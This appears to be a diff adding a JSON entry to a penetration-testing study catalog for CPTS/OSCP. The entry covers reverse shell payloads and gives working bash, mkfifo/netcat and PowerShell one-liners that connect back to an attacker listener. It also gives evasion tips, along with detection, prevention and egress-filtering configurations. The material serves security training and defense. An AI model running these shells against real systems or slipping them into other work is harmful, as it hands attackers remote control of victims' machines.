@@ -1,0 +1,95 @@
+{
+  "type": "payload",
+  "platform": "linux",
+  "requires": [
+    "network-access"
+  ],
+  "protocols": [],
+  "tools": [
+    "bash",
+    "powershell"
+  ],
+  "tags": [
+    "reverse-shell",
+    "payload"
+  ],
+  "category": "Exploitation",
+  "subcategory": "Shells & Payloads",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 02: Getting Started",
+  "examples": [
+    {
+      "label": "Bash TCP reverse shell back to your listener",
+      "command": "bash -c 'bash -i >& /dev/tcp/10.10.14.12/443 0>&1'"
+    }
+  ],
+  "notes": "Catch with: nc -lvnp 1234. More one-liners: PayloadsAllTheThings / InternalAllTheThings reverse-shell cheatsheet.",
+  "references": [
+    {
+      "title": "Reverse Shell Cheatsheet",
+      "url": "https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/"
+    },
+    {
+      "title": "HTB Academy - Getting Started",
+      "url": "https://academy.hackthebox.com/module/details/77"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "gs-nc-listener",
+      "rel": "prereq",
+      "note": "Start the listener first."
+    },
+    {
+      "id": "gs-tty-upgrade",
+      "rel": "next",
+      "note": "Stabilize the shell."
+    }
+  ],
+  "id": "gs-reverse-shells",
+  "name": "Reverse Shell Payloads",
+  "command": "bash -c 'bash -i >& /dev/tcp/<lhost>/<lport> 0>&1'",
+  "description": "Run on the target to connect back to your listener. The victim initiates the connection, which usually beats outbound firewall rules.",
+  "variations": [
+    {
+      "label": "Linux bash",
+      "command": "bash -c 'bash -i >& /dev/tcp/<lhost>/1234 0>&1'"
+    },
+    {
+      "label": "Linux mkfifo (sh)",
+      "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <lhost> 1234 >/tmp/f"
+    },
+    {
+      "label": "Windows PowerShell",
+      "command": "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('<lhost>',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()\""
+    }
+  ],
+  "opsec": "loud",
+  "mitre": [
+    "T1059.004"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "Unix shells (bash, sh, zsh, etc.) are present by default on Linux and macOS and control every aspect of a system. Certain commands require elevated privileges, but interactive shell access provides a powerful execution environment that attackers use for commands, file operations, pivoting, and spawning further processes.",
+    "prerequisites": "Code execution on the target and network egress to the attacker's listener.",
+    "impact": "An interactive shell on the attacker's side, initiated outbound from the target — bypassing inbound firewall rules.",
+    "detection": "Monitor for Unix shell execution from unexpected parent processes (e.g., a web server or database process spawning bash). Flag shell activity following unusual network connections, file writes to web directories, or privilege escalation attempts.",
+    "artifacts": "An outbound connection from the target to the listener; a shell interpreter spawned with a network redirect (e.g. bash -i >& /dev/tcp/...) in process logs.",
+    "prevention": "Use application control where appropriate to restrict which binaries can execute. On ESXi hosts, the execInstalledOnly feature prevents binaries from running unless packaged and signed as part of a vSphere installation bundle (VIB).",
+    "evasion": "Connect outbound to a common port (443) to bypass inbound firewall rules and blend with normal egress; use an encrypted channel (socat/OpenSSL) and encode the payload to defeat inspection and signature matching.",
+    "sources": [
+      "MITRE T1059.004"
+    ],
+    "misconfiguration": "Outbound connections from servers are not filtered — any process can initiate a TCP connection to arbitrary external IPs on any port. This enables reverse shell callbacks. Additionally, common shell payloads (nc, bash, python) are available on the target, and PowerShell execution policy is not enforced.",
+    "vulnerable_config": "# No egress firewall rules on compromised host:\niptables -L OUTPUT  # policy ACCEPT, no rules\n# nc, bash, python3 all available\n\n# Windows — PowerShell unrestricted:\nGet-ExecutionPolicy  # Unrestricted or Bypass\n# Defender not detecting reverse shell payloads (AV evasion successful)",
+    "secure_config": "# Linux egress filtering:\niptables -P OUTPUT DROP\niptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\niptables -A OUTPUT -p tcp --dport 443 -d <known_good_ips> -j ACCEPT\n# Blocks arbitrary reverse shell callbacks\n\n# Windows — PowerShell Constrained Language Mode:\n# GPO: Enable WDAC policy\n# Set execution policy = AllSigned (unsigned scripts blocked)\n\n# Windows Defender AMSI: scans all PS scripts before execution\n# AMSI bypass detection: EDR products detect common AMSI bypass patterns\n\n# Application allowlisting (AppLocker/WDAC):\n# Blocks execution of dropped payloads and LOLBin abuse\n# The most effective defense against arbitrary payload execution"
+  }
+}
